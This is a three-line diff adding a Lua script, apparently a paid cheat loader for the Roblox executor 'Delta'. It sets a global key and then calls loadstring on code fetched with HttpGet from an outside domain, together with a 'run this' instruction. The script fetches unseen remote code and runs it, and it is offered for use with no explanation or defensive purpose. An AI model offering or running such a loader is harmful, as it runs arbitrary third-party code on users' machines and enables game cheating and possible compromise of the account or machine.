@@ -1,0 +1,3 @@
+-- run this -- Paid delta
+_G.key = "f0231baa47b0934d1009d17788fa8150f2146c12118824c12f1f5f816d49709d"
+loadstring(game:HttpGet("https://protogen.gay/new/loaderpd"))()
